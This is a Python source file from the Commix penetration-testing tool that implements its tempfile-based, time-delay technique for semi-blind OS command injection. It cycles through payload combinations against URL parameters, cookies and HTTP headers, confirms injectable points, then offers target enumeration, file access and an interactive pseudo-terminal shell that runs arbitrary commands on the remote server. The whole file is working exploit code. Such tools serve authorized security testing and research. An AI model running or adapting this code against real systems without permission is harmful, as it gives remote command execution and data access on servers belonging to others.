#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (http://commixproject.com).
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import os
import re
import sys
import time
import string
import random
import base64
import urllib
import urllib2
  
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import session_handler

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.shells import reverse_tcp

from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters

from src.core.injections.controller import checks
from src.core.injections.controller import shell_options

from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector
from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads
from src.core.injections.semiblind.techniques.tempfile_based import tfb_enumeration
from src.core.injections.semiblind.techniques.tempfile_based import tfb_file_access

from src.core.injections.semiblind.techniques.file_based import fb_injector

readline_error = False
if settings.IS_WINDOWS:
  try:
    import readline
  except ImportError:
    try:
      import pyreadline as readline
    except ImportError:
      readline_error = True
else:
  try:
    import readline
    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
      import gnureadline as readline
  except ImportError:
    try:
      import gnureadline as readline
    except ImportError:
      readline_error = True
pass

"""
The "tempfile-based" injection technique on semiblind OS command injection.
__Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive results.
"""

"""
Delete previous shells outputs.
"""
def delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
  if settings.VERBOSITY_LEVEL >= 1:
    info_msg = "Deleting the created (" + OUTPUT_TEXTFILE + ") file...\n"
    sys.stdout.write(settings.print_info_msg(info_msg))
  if settings.TARGET_OS == "win":
    cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
  else:
    settings.WEB_ROOT = ""
    cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + " " + settings.COMMENT 
  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)

"""
The "tempfile-based" injection technique handler
"""
def tfb_injection_handler(url, timesec, filename, tmp_path, http_request_method, url_time_response):

  counter = 1
  num_of_chars = 1
  vp_flag = True
  no_result = True
  is_encoded = False
  possibly_vulnerable = False
  false_positive_warning = False
  export_injection_info = False
  how_long = 0
  injection_type = "semi-blind command injection"
  technique = "tempfile-based injection technique"

  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    maxlen = settings.MAXLEN
    
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    err_msg = "The '--url-reload' option is not available in " + technique + "!"
    print settings.print_critical_msg(err_msg)

  if not settings.LOAD_SESSION: 
    # Change TAG on every request to prevent false-positive resutls.
    TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6)) 

  if settings.VERBOSITY_LEVEL >= 1:
    info_msg ="Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "... "
    print settings.print_info_msg(info_msg)

  #whitespace = checks.check_whitespaces()
  # Calculate all possible combinations
  total = len(settings.WHITESPACE) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
  for whitespace in settings.WHITESPACE:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
        for separator in settings.SEPARATORS:
          # Check injection state
          settings.DETECTION_PHASE = True
          settings.EXPLOITATION_PHASE = False
          # If a previous session is available.
          how_long_statistic = []
          if settings.LOAD_SESSION:
            try:
              settings.TEMPFILE_BASED_STATE = True 
              cmd = shell = ""
              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
              checks.check_for_stored_tamper(payload)
              settings.FOUND_HOW_LONG = how_long
              settings.FOUND_DIFF = how_long - timesec
              OUTPUT_TEXTFILE = tmp_path + TAG + ".txt"
            except TypeError:
              err_msg = "An error occurred while accessing session file ('"
              err_msg += settings.SESSION_FILE + "'). "
              err_msg += "Use the '--flush-session' option."
              print settings.print_critical_msg(err_msg)
              sys.exit(0)

          else:
            num_of_chars = num_of_chars + 1
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""

            # The output file for file-based injection technique.
            OUTPUT_TEXTFILE = tmp_path + TAG + ".txt"
            alter_shell = menu.options.alter_shell
            tag_length = len(TAG) + 4
            
            for output_length in range(1, int(tag_length)):
              try:
                # Tempfile-based decision payload (check if host is vulnerable).
                if alter_shell :
                  payload = tfb_payloads.decision_alter_shell(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
                else:
                  payload = tfb_payloads.decision(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)

                # Fix prefixes / suffixes
                payload = parameters.prefixes(payload, prefix)
                payload = parameters.suffixes(payload, suffix)

                # Whitespace fixation
                payload = re.sub(" ", whitespace, payload)
                
                # Check for base64 / hex encoding
                payload = checks.perform_payload_encoding(payload)

                # Check if defined "--verbose" option.
                if settings.VERBOSITY_LEVEL == 1:
                  payload_msg = payload.replace("\n", "\\n")
                  print settings.print_payload(payload_msg)
                elif settings.VERBOSITY_LEVEL > 1:
                  info_msg = "Generating a payload for injection..."
                  print settings.print_info_msg(info_msg)
                  print settings.print_payload(payload) 
                  
                # Cookie Injection
                if settings.COOKIE_INJECTION == True:
                  # Check if target host is vulnerable to cookie injection.
                  vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                  how_long = tfb_injector.cookie_injection_test(url, vuln_parameter, payload)
                  
                # User-Agent Injection
                elif settings.USER_AGENT_INJECTION == True:
                  # Check if target host is vulnerable to user-agent injection.
                  vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                  how_long = tfb_injector.user_agent_injection_test(url, vuln_parameter, payload)

                # Referer Injection
                elif settings.REFERER_INJECTION == True:
                  # Check if target host is vulnerable to referer injection.
                  vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                  how_long = tfb_injector.referer_injection_test(url, vuln_parameter, payload)

                # Custom HTTP header Injection
                elif settings.CUSTOM_HEADER_INJECTION == True:
                  # Check if target host is vulnerable to custom http header injection.
                  vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                  how_long = tfb_injector.custom_header_injection_test(url, vuln_parameter, payload)

                else:
                  # Check if target host is vulnerable.
                  how_long, vuln_parameter = tfb_injector.injection_test(payload, http_request_method, url)

                # Statistical analysis in time responses.
                how_long_statistic.append(how_long)

                # Injection percentage calculation
                percent = ((num_of_chars * 100) / total)
                float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(total*1.0)),2))

                if percent == 100 and no_result == True:
                  if not settings.VERBOSITY_LEVEL >= 1:
                    percent = Fore.RED + "FAILED" + Style.RESET_ALL
                  else:
                    percent = ""
                else:
                  if (url_time_response == 0 and (how_long - timesec) >= 0) or \
                     (url_time_response != 0 and (how_long - timesec) == 0 and (how_long == timesec)) or \
                     (url_time_response != 0 and (how_long - timesec) > 0 and (how_long >= timesec + 1)) :

                    # Time relative false positive fixation.
                    false_positive_fixation = False
                    if len(TAG) == output_length:

                      # Simple statical analysis
                      statistical_anomaly = True
                      if len(set(how_long_statistic[0:5])) == 1:
                        if max(xrange(len(how_long_statistic)), key=lambda x: how_long_statistic[x]) == len(TAG) - 1:
                          statistical_anomaly = False
                          how_long_statistic = []  

                      if timesec <= how_long and not statistical_anomaly:
                        false_positive_fixation = True
                      else:
                        false_positive_warning = True

                    # Identified false positive warning message.
                    if false_positive_warning:
                      warn_msg = "Unexpected time delays have been identified due to unstable "
                      warn_msg += "requests. This behavior may lead to false-positive results.\n"
                      sys.stdout.write("\r" + settings.print_warning_msg(warn_msg))
                      while True:
                        if not menu.options.batch:
                          question_msg = "How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > "
                          sys.stdout.write(settings.print_question_msg(question_msg))
                          proceed_option = sys.stdin.readline().replace("\n","").lower()
                        else:
                          proceed_option = ""  
                        if len(proceed_option) == 0:
                           proceed_option = "c"
                        if proceed_option.lower() in settings.CHOICE_PROCEED :
                          if proceed_option.lower() == "s":
                            false_positive_fixation = False
                            raise
                          elif proceed_option.lower() == "c":
                            timesec = timesec + 1
                            false_positive_fixation = True
                            break
                          elif proceed_option.lower() == "q":
                            raise SystemExit()
                        else:
                          err_msg = "'" + proceed_option + "' is not a valid answer."
                          print settings.print_error_msg(err_msg)
                          pass

                    # Check if false positive fixation is True.
                    if false_positive_fixation:
                      false_positive_fixation = False
                      settings.FOUND_HOW_LONG = how_long
                      settings.FOUND_DIFF = how_long - timesec
                      if false_positive_warning:
                        time.sleep(1)
                      randv1 = random.randrange(0, 4)
                      randv2 = random.randrange(1, 5)
                      randvcalc = randv1 + randv2

                      if settings.TARGET_OS == "win":
                        if alter_shell:
                          cmd = settings.WIN_PYTHON_DIR + " -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
                        else:
                          cmd = "powershell.exe -InputFormat none write (" + str(randv1) + " + " + str(randv2) + ")"
                      else:
                        cmd = "echo $((" + str(randv1) + " + " + str(randv2) + "))"

                      # Set the original delay time
                      original_how_long = how_long
                      
                      # Check for false positive resutls
                      how_long, output = tfb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, how_long, url_time_response)

                      if (url_time_response == 0 and (how_long - timesec) >= 0) or \
                         (url_time_response != 0 and (how_long - timesec) == 0 and (how_long == timesec)) or \
                         (url_time_response != 0 and (how_long - timesec) > 0 and (how_long >= timesec + 1)) :
                        
                        if str(output) == str(randvcalc) and len(TAG) == output_length:
                          possibly_vulnerable = True
                          how_long_statistic = 0
                          if not settings.VERBOSITY_LEVEL >= 1:
                            percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                          else:
                            percent = ""
                          #break  
                      else:
                        break
                    # False positive
                    else:
                      if not settings.VERBOSITY_LEVEL >= 1:
                        percent = str(float_percent)+ "%"
                        info_msg =  "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "... " +  "[ " + percent + " ]"
                        sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                        sys.stdout.flush()
                      continue    
                  else:
                    if not settings.VERBOSITY_LEVEL >= 1:
                      percent = str(float_percent)+ "%"
                      info_msg =  "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "... " +  "[ " + percent + " ]"
                      sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                      sys.stdout.flush()
                    continue
                if not settings.VERBOSITY_LEVEL >= 1:
                  info_msg =  "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "... " +  "[ " + percent + " ]"
                  sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                  sys.stdout.flush()
                  
              except KeyboardInterrupt: 
                if settings.VERBOSITY_LEVEL >= 1:
                  print ""
                if 'cmd' in locals():
                  # Delete previous shell (text) files (output) from temp.
                  delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                raise

              except SystemExit: 
                # Delete previous shell (text) files (output) from temp.
                delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                raise

              except:
                percent = ((num_of_chars * 100) / total)
                float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(total*1.0)),2))
                if str(float_percent) == "100.0":
                  if no_result == True:
                    if not settings.VERBOSITY_LEVEL >= 1:
                      percent = Fore.RED + "FAILED" + Style.RESET_ALL
                      info_msg =  "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "... " +  "[ " + percent + " ]"
                      sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                      sys.stdout.flush()
                    else:
                      percent = ""
                  else:
                    percent = str(float_percent) + "%"
                    print ""
                    # Print logs notification message
                    logs.logs_notification(filename)
                  #raise
                else:
                  percent = str(float_percent) + "%"
              break
          # Yaw, got shellz! 
          # Do some magic tricks!
          if (url_time_response == 0 and (how_long - timesec) >= 0) or \
             (url_time_response != 0 and (how_long - timesec) == 0 and (how_long == timesec)) or \
             (url_time_response != 0 and (how_long - timesec) > 0 and (how_long >= timesec + 1)) :

            if (len(TAG) == output_length) and \
               (possibly_vulnerable == True or settings.LOAD_SESSION and int(is_vulnerable) == menu.options.level):

              found = True
              no_result = False
              # Check injection state
              settings.DETECTION_PHASE = False
              settings.EXPLOITATION_PHASE = True
              if settings.LOAD_SESSION:
                if whitespace == "%20":
                  whitespace = " "
                possibly_vulnerable = False

              if settings.COOKIE_INJECTION == True: 
                header_name = " cookie"
                found_vuln_parameter = vuln_parameter
                the_type = " parameter"

              elif settings.USER_AGENT_INJECTION == True: 
                header_name = " User-Agent"
                found_vuln_parameter = ""
                the_type = " HTTP header"

              elif settings.REFERER_INJECTION == True: 
                header_name = " Referer"
                found_vuln_parameter = ""
                the_type = " HTTP header"

              elif settings.CUSTOM_HEADER_INJECTION == True: 
                header_name = " " + settings.CUSTOM_HEADER_NAME
                found_vuln_parameter = ""
                the_type = " HTTP header"

              else:
                header_name = ""
                the_type = " parameter"
                if http_request_method == "GET":
                  found_vuln_parameter = parameters.vuln_GET_param(url)
                else :
                  found_vuln_parameter = vuln_parameter

              if len(found_vuln_parameter) != 0 :
                found_vuln_parameter = " '" +  found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'" 

              # Print the findings to log file.
              if export_injection_info == False:
                export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
              if vp_flag == True:
                vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
              logs.update_payload(filename, counter, payload) 
              counter = counter + 1

              if not settings.VERBOSITY_LEVEL > 1 and not settings.LOAD_SESSION:
                print ""

              # Print the findings to terminal.
              success_msg = "The"
              if found_vuln_parameter == " ": 
                success_msg += http_request_method + "" 
              success_msg += the_type + header_name
              success_msg += found_vuln_parameter + " seems injectable via "
              success_msg += "(" + injection_type.split(" ")[0] + ") " + technique + "."
              print settings.print_success_msg(success_msg)
              print settings.SUB_CONTENT_SIGN + "Payload: " + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
              # Export session
              if not settings.LOAD_SESSION:
                shell = ""
                session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, original_how_long, output_length, is_vulnerable=menu.options.level)
                #possibly_vulnerable = False
              else:
                settings.LOAD_SESSION = False 
                
              # Delete previous shell (text) files (output) from temp.
              delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
              if settings.TARGET_OS == "win":
                time.sleep(1)
              
              new_line = False  
              # Check for any enumeration options.
              if settings.ENUMERATION_DONE == True :
                while True:
                  if not menu.options.batch:
                    question_msg = "Do you want to enumerate again? [Y/n] > "
                    enumerate_again = raw_input("\n" + settings.print_question_msg(question_msg)).lower()
                  else:
                    enumerate_again = ""
                  if len(enumerate_again) == 0:
                    enumerate_again = "y"
                  if enumerate_again in settings.CHOICE_YES:
                    tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                    print ""
                    break
                  elif enumerate_again in settings.CHOICE_NO: 
                    new_line = True
                    break
                  elif enumerate_again in settings.CHOICE_QUIT:
                    # Delete previous shell (text) files (output) from temp.
                    delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)    
                    sys.exit(0)
                  else:
                    err_msg = "'" + enumerate_again + "' is not a valid answer."
                    print settings.print_error_msg(err_msg)
                    pass
              else:
                if menu.enumeration_options():
                  tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                  print ""

              # Check for any system file access options.
              if settings.FILE_ACCESS_DONE == True :
                print ""
                while True:
                  if not menu.options.batch:
                    question_msg = "Do you want to access files again? [Y/n] > "
                    sys.stdout.write(settings.print_question_msg(question_msg))
                    file_access_again = sys.stdin.readline().replace("\n","").lower()
                  else:
                    file_access_again = ""
                  if len(file_access_again) == 0:
                    file_access_again = "y"
                  if file_access_again in settings.CHOICE_YES:
                    tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                    break
                  elif file_access_again in settings.CHOICE_NO: 
                    if not new_line:
                      new_line = True
                    break
                  elif file_access_again in settings.CHOICE_QUIT:
                    # Delete previous shell (text) files (output) from temp.
                    delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                    sys.exit(0)
                  else:
                    err_msg = "'" + file_access_again + "' is not a valid answer."  
                    print settings.print_error_msg(err_msg)
                    pass
              else:
                # if not menu.enumeration_options() and not menu.options.os_cmd:
                #   print ""
                tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
              
              # Check if defined single cmd.
              if menu.options.os_cmd:
                check_how_long, output = tfb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                # Export injection result
                tfb_injector.export_injection_results(cmd, separator, output, check_how_long)
                # Delete previous shell (text) files (output) from temp.
                if settings.VERBOSITY_LEVEL >= 1:
                  print ""
                delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                logs.print_logs_notification(filename, url) 
                sys.exit(0)  

              if settings.VERBOSITY_LEVEL >= 1 or not new_line:
                print ""
              try:    
                # Pseudo-Terminal shell
                go_back = False
                go_back_again = False
                while True:
                  if go_back == True:
                    break
                  if not menu.options.batch:
                    question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
                    sys.stdout.write(settings.print_question_msg(question_msg))
                    gotshell = sys.stdin.readline().replace("\n","").lower()
                  else:
                    gotshell = ""
                  if len(gotshell) == 0:
                     gotshell = "y"
                  if gotshell in settings.CHOICE_YES:
                    if not menu.options.batch:
                      print ""
                    print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                    if readline_error:
                      checks.no_readline_module()
                    while True:
                      if false_positive_warning:
                        warn_msg = "Due to unexpected time delays, it is highly "
                        warn_msg += "recommended to enable the 'reverse_tcp' option.\n"
                        sys.stdout.write("\r" + settings.print_warning_msg(warn_msg))
                        false_positive_warning = False

                      # Tab compliter
                      if not readline_error:
                        readline.set_completer(menu.tab_completer)
                        # MacOSX tab compliter
                        if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
                          readline.parse_and_bind("bind ^I rl_complete")
                        # Unix tab compliter
                        else:
                          readline.parse_and_bind("tab: complete")
                      cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                      cmd = checks.escaped_cmd(cmd)
                      if cmd.lower() in settings.SHELL_OPTIONS:
                        go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE="")
                        if go_back and go_back_again == False:
                          break
                        if go_back and go_back_again:
                          return True 
                      if menu.options.ignore_session or \
                         session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                        # The main command injection exploitation.
                        check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                        # Export injection result
                        tfb_injector.export_injection_results(cmd, separator, output, check_how_long)
                        if not menu.options.ignore_session :
                          session_handler.store_cmd(url, cmd, output, vuln_parameter)
                      else:
                        output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                        # Update logs with executed cmds and execution results.
                        logs.executed_command(filename, cmd, output)
                        print "\n" + Fore.GREEN + Style.BRIGHT + output + Style.RESET_ALL + "\n"
                      # Update logs with executed cmds and execution results.
                      logs.executed_command(filename, cmd, output)

                  elif gotshell in settings.CHOICE_NO:
                    if checks.next_attack_vector(technique, go_back) == True:
                      break
                    else:
                      if no_result == True:
                        return False 
                      else:
                        # Delete previous shell (text) files (output) from temp.
                        delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                        return True  
                  elif gotshell in settings.CHOICE_QUIT:
                    # Delete previous shell (text) files (output) from temp.
                    delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                    sys.exit(0)
                  else:
                    err_msg = "'" + gotshell + "' is not a valid answer."  
                    print settings.print_error_msg(err_msg)
                    pass

              except KeyboardInterrupt:
                if settings.VERBOSITY_LEVEL >= 1:
                  print ""
                # Delete previous shell (text) files (output) from temp.
                delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                raise  

              except SystemExit: 
                # Delete previous shell (text) files (output) from temp.
                delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                raise 
  
  if no_result == True:
    if settings.VERBOSITY_LEVEL == 0:
      print ""
    return False

  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response):
  # Check if attack is based on time delays.
  if not settings.TIME_RELATIVE_ATTACK :
    settings.TIME_RELATIVE_ATTACK = True

  if tfb_injection_handler(url, timesec, filename, tmp_path, http_request_method, url_time_response) == False:
    settings.TIME_RELATIVE_ATTACK = False
    settings.TEMPFILE_BASED_STATE = False
    return False
    
#eof 